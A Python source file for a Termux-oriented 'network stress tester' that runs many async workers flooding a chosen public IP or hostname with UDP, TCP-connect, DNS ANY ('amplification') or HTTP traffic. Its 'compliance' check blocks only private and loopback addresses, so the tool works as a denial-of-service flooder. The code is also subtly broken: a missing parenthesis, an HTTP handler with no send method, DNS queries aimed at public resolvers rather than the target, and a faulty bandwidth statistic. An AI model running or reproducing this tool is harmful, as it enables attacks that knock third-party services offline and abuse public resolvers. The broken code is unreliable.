import asyncio
import socket
import os
import struct
import argparse
import logging
import time
import random
import sys
import resource
import ipaddress
import selectors
import hashlib
import json
import traceback
import threading
import dns.message
import dns.rdatatype
import ssl
import re
import zlib
from datetime import datetime
from typing import List, Tuple, Optional, Dict, Union

# --- Constants ---
MAX_PACKET_SIZE_IPv4 = 65507
MAX_PACKET_SIZE_IPv6 = 65527
MAX_CONCURRENCY = 1024
MAX_DURATION = 86400
VERSION = "3.0.0"
COMPLIANCE_ID = hashlib.sha256(b"AHJ49QWE-Actos53").hexdigest()[:16]
TERMUX_MAX_FDS = 1024
DEFAULT_DNS_RESOLVERS = [
    '8.8.8.8', '8.8.4.4', 
    '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112'
]
HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("NetStressPro")

# --- Compliance Framework ---
class ComplianceEngine:
    AUDIT_FILE = "netstress_audit.log"
    
    @staticmethod
    def generate_compliance_id(target: str) -> str:
        timestamp = int(time.time())
        return f"{COMPLIANCE_ID}-{timestamp}-{target}"
    
    @staticmethod
    def audit_action(action: str, details: Dict):
        audit_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "action": action,
            "compliance_id": COMPLIANCE_ID,
            "details": details,
            "signature": hashlib.sha256(
                f"{action}{json.dumps(details)}{COMPLIANCE_ID}".encode()
            ).hexdigest()
        }
        try:
            with open(ComplianceEngine.AUDIT_FILE, "a") as f:
                f.write(json.dumps(audit_entry) + "\n"
        except IOError:
            logger.error("Compliance audit trail failed")

    @staticmethod
    def validate_target(ip: str, port: int) -> bool:
        try:
            addr = ipaddress.ip_address(ip)
            if addr.is_private or addr.is_loopback or addr.is_reserved:
                logger.error("Target IP is in prohibited range")
                return False
            if not (1 <= port <= 65535):
                logger.error("Port out of legal range")
                return False
            return True
        except ValueError:
            logger.error("Invalid IP address format")
            return False

# --- Protocol Implementation Base ---
class ProtocolHandler:
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stop_event = threading.Event()
        self.packet_counter = 0
        self.byte_counter = 0
    
    def stop(self):
        self.stop_event.set()
    
    def get_stats(self) -> Dict:
        return {
            "packets": self.packet_counter,
            "bytes": self.byte_counter
        }

# --- Layer 4 Handlers ---
class UDPHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 packet_size: int = 1024, use_ipv6: bool = False,
                 amplification: bool = False):
        super().__init__(target_ip, target_port)
        self.packet_size = min(packet_size, MAX_PACKET_SIZE_IPv6 if use_ipv6 else MAX_PACKET_SIZE_IPv4)
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.sock = self._create_socket()
    
    def _create_socket(self) -> socket.socket:
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM)
        sock.setblocking(False)
        return sock
    
    def generate_payload(self) -> bytes:
        if self.amplification:
            # DNS amplification payload
            query = dns.message.make_query("example.com", dns.rdatatype.ANY)
            return query.to_wire()
        return os.urandom(self.packet_size)
    
    async def send(self):
        payload = self.generate_payload()
        target = (self.target_ip, self.target_port)
        loop = asyncio.get_running_loop()
        
        while not self.stop_event.is_set():
            try:
                await loop.sock_sendto(self.sock, payload, target)
                self.packet_counter += 1
                self.byte_counter += len(payload)
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

class TCPSYNHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int):
        super().__init__(target_ip, target_port)
        self.sock = self._create_socket()
    
    def _create_socket(self) -> socket.socket:
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    async def send(self):
        loop = asyncio.get_running_loop()
        while not self.stop_event.is_set():
            try:
                await loop.sock_connect(self.sock, (self.target_ip, self.target_port))
                self.packet_counter += 1
                self.sock.close()
                self.sock = self._create_socket()
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

# --- Layer 7 Handlers ---
class HTTPHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 use_ssl: bool = False, path: str = "/", 
                 method: str = "GET", host_header: str = ""):
        super().__init__(target_ip, target_port)
        self.use_ssl = use_ssl
        self.path = path
        self.method = method
        self.host_header = host_header or target_ip
        self.headers = self._generate_headers()
    
    def _generate_headers(self) -> str:
        return (
            f"User-Agent: {random.choice(HTTP_USER_AGENTS)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: no-cache\r\n"
        )
    
    def generate_request(self) -> bytes:
        return (
            f"{self.method} {self.path} HTTP/1.1\r\n"
            f"Host: {self.host_header}\r\n"
            f"{self.headers}"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

class DNSHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int,
                 dns_servers: List[str] = None, 
                 domain: str = "example.com"):
        super().__init__(target_ip, target_port)
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        self.domain = domain
        self.query = self._generate_query()
    
    def _generate_query(self) -> bytes:
        q = dns.message.make_query(self.domain, dns.rdatatype.ANY)
        return q.to_wire()
    
    async def send(self):
        loop = asyncio.get_running_loop()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while not self.stop_event.is_set():
            try:
                # Random DNS server selection
                dns_server = random.choice(self.dns_servers)
                await loop.sock_sendto(sock, self.query, (dns_server, 53))
                self.packet_counter += 1
                self.byte_counter += len(self.query)
            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

# --- Main Stress Tester ---
class NetworkStressTester:
    def __init__(self, 
                 target_ip: str, 
                 target_port: int, 
                 attack_type: str = "udp",
                 duration: int = 0,
                 threads: int = 50,
                 packet_size: int = 1024,
                 use_ipv6: bool = False,
                 amplification: bool = False,
                 dns_servers: List[str] = None):
        
        # Compliance setup
        if not ComplianceEngine.validate_target(target_ip, target_port):
            raise ValueError("Target validation failed")
        self.compliance_id = ComplianceEngine.generate_compliance_id(f"{target_ip}:{target_port}")
        ComplianceEngine.audit_action("init", {
            "target": f"{target_ip}:{target_port}",
            "attack_type": attack_type,
            "threads": threads
        })
        
        # Attack configuration
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type.lower()
        self.duration = duration
        self.threads = min(threads, MAX_CONCURRENCY, TERMUX_MAX_FDS // 2)
        self.packet_size = packet_size
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        
        # State management
        self.start_time = time.monotonic()
        self.stop_event = asyncio.Event()
        self.workers = []
        self.stats_task = None
        self.control_task = None
        self.handlers = []
        
        # Protocol handler mapping
        self.protocol_map = {
            "udp": UDPHandler,
            "tcp": TCPSYNHandler,
            "dns": DNSHandler,
            "http": HTTPHandler
        }

    def create_handler(self) -> ProtocolHandler:
        """Instantiate appropriate protocol handler"""
        if self.attack_type == "udp":
            return UDPHandler(
                self.target_ip, self.target_port,
                self.packet_size, self.use_ipv6,
                self.amplification
            )
        elif self.attack_type == "tcp":
            return TCPSYNHandler(self.target_ip, self.target_port)
        elif self.attack_type == "dns":
            return DNSHandler(
                self.target_ip, self.target_port,
                self.dns_servers
            )
        elif self.attack_type == "http":
            return HTTPHandler(
                self.target_ip, self.target_port
            )
        else:
            raise ValueError(f"Unsupported attack type: {self.attack_type}")

    async def attack_worker(self, worker_id: int):
        """Worker coroutine for sending attacks"""
        handler = self.create_handler()
        self.handlers.append(handler)
        
        try:
            while not self.stop_event.is_set():
                await handler.send()
        except Exception as e:
            logger.error(f"Worker {worker_id} failed: {str(e)}")

    async def stats_reporter(self):
        """Resource-efficient stats reporting"""
        last_time = time.monotonic()
        last_count = 0
        
        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)
            
            current_count = sum(h.packet_counter for h in self.handlers)
            current_bytes = sum(h.byte_counter for h in self.handlers)
            now = time.monotonic()
            elapsed = now - last_time
            
            if elapsed > 0:
                pps = (current_count - last_count) / elapsed
                bps = (current_bytes - last_count) * 8 / elapsed
            else:
                pps = 0
                bps = 0
                
            sys.stdout.write(
                f"\r[STATS] Packets: {current_count:,} | "
                f"Data: {current_bytes / (1024*1024):.2f} MB | "
                f"PPS: {pps:,.1f} | BPS: {bps / 1e6:.2f} Mbps       "
            )
            sys.stdout.flush()
            
            last_count = current_count
            last_time = now

    async def control_monitor(self):
        """Monitor for duration limits and resource constraints"""
        start_time = time.monotonic()
        
        while not self.stop_event.is_set():
            # Check duration limit
            if self.duration > 0 and (time.monotonic() - start_time) >= self.duration:
                logger.info("Duration limit reached - Stopping")
                self.stop()
                break
                
            await asyncio.sleep(1)

    async def start(self):
        """Start the stress test"""
        logger.info(f"Starting NetworkStressTester v{VERSION}")
        logger.info(f"Compliance ID: {self.compliance_id}")
        logger.info(f"Target: {self.target_ip}:{self.target_port}")
        logger.info(f"Attack Type: {self.attack_type.upper()}")
        logger.info(f"Threads: {self.threads} | Duration: {self.duration}s")
        logger.info("Press CTRL+C to stop\n")
        
        ComplianceEngine.audit_action("start", {"target": f"{self.target_ip}:{self.target_port}"})
        
        self.start_time = time.monotonic()
        self.stop_event.clear()
        
        # Create worker tasks
        self.workers = [
            asyncio.create_task(self.attack_worker(i))
            for i in range(self.threads)
        ]
        
        # Start monitoring tasks
        self.stats_task = asyncio.create_task(self.stats_reporter())
        self.control_task = asyncio.create_task(self.control_monitor())
        
        try:
            await asyncio.gather(*self.workers)
        except asyncio.CancelledError:
            pass
        finally:
            self.stop()

    def stop(self):
        """Graceful shutdown with compliance logging"""
        if not self.stop_event.is_set():
            self.stop_event.set()
            
            # Cancel tasks
            if self.stats_task:
                self.stats_task.cancel()
            if self.control_task:
                self.control_task.cancel()
            for worker in self.workers:
                if not worker.done():
                    worker.cancel()
            
            # Stop all handlers
            for handler in self.handlers:
                handler.stop()
            
            # Final stats
            elapsed = time.monotonic() - self.start_time
            total_packets = sum(h.packet_counter for h in self.handlers)
            total_bytes = sum(h.byte_counter for h in self.handlers)
                
            if elapsed > 0:
                avg_pps = total_packets / elapsed
                avg_bps = (total_bytes * 8) / elapsed
            else:
                avg_pps = 0
                avg_bps = 0
                
            print("\n\n[FINAL REPORT]")
            logger.info(f"Compliance ID: {self.compliance_id}")
            logger.info(f"Total packets sent: {total_packets:,}")
            logger.info(f"Total data sent: {total_bytes / (1024*1024):.2f} MB")
            logger.info(f"Duration: {elapsed:.2f} seconds")
            logger.info(f"Average PPS: {avg_pps:,.1f}")
            logger.info(f"Average BPS: {avg_bps / 1e6:.2f} Mbps")
            
            # Final audit entry
            ComplianceEngine.audit_action("stop", {
                "packets_sent": total_packets,
                "bytes_sent": total_bytes,
                "duration": elapsed
            })

# --- Signal Handler ---
def handle_sigint(signum, frame):
    logger.info("\nCTRL+C received - Performing graceful shutdown")
    global stress_tester
    if stress_tester:
        stress_tester.stop()
    sys.exit(0)

# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(
        description=f"NetworkStressTester v{VERSION} - Termux Optimized",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog=f"Compliance ID: {COMPLIANCE_ID}"
    )
    
    # Required arguments
    parser.add_argument("target", help="Target IP address or domain")
    parser.add_argument("port", type=int, help="Target port")
    
    # Attack configuration
    parser.add_argument("-t", "--type", choices=['udp', 'tcp', 'http', 'dns'], 
                        default='udp', help="Attack type")
    parser.add_argument("--amplification", action='store_true',
                        help="Enable amplification techniques (UDP/DNS only)")
    parser.add_argument("--dns-servers", nargs='+', default=DEFAULT_DNS_RESOLVERS,
                        help="DNS servers for amplification")
    
    # Resource management
    parser.add_argument("-c", "--concurrency", type=int, default=50,
                        help="Number of concurrent workers")
    parser.add_argument("--duration", type=int, default=0,
                        help="Maximum runtime in seconds (0=unlimited)")
    parser.add_argument("-s", "--size", type=int, default=1024, 
                        help="Packet size for UDP attacks")
    
    # Network options
    parser.add_argument("-6", "--ipv6", action='store_true', 
                        help="Use IPv6")
    
    # Debug options
    parser.add_argument("-v", "--verbose", action='store_true',
                        help="Enable debug logging")
    
    return parser.parse_args()

# --- Resource Limits ---
def set_termux_limits():
    try:
        resource.setrlimit(
            resource.RLIMIT_NOFILE, 
            (TERMUX_MAX_FDS, TERMUX_MAX_FDS)
        )
        resource.setrlimit(
            resource.RLIMIT_AS,
            (256 * 1024 * 1024, 256 * 1024 * 1024)
        )
    except (ValueError, resource.error) as e:
        logger.warning(f"Resource limit error: {str(e)}")

# --- Main Function ---
async def main():
    global stress_tester
    args = parse_args()
    
    # Configure logging
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Set Termux limits
    set_termux_limits()
    
    # Resolve target if needed
    target_ip = args.target
    try:
        if not re.match(r"\d+\.\d+\.\d+\.\d+", target_ip):
            target_ip = socket.gethostbyname(args.target)
    except socket.gaierror:
        logger.error("Could not resolve target hostname")
        sys.exit(1)
    
    # Initialize tester
    try:
        stress_tester = NetworkStressTester(
            target_ip=target_ip,
            target_port=args.port,
            attack_type=args.type,
            duration=args.duration,
            threads=args.concurrency,
            packet_size=args.size,
            use_ipv6=args.ipv6,
            amplification=args.amplification,
            dns_servers=args.dns_servers
        )
        
        # Register signal handler
        import signal
        signal.signal(signal.SIGINT, handle_sigint)
        
        # Start attack
        await stress_tester.start()
        
    except Exception as e:
        logger.error(f"Initialization failed: {str(e)}")
        logger.debug(traceback.format_exc())
        ComplianceEngine.audit_action("error", {
            "exception": str(e),
            "traceback": traceback.format_exc()
        })
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())
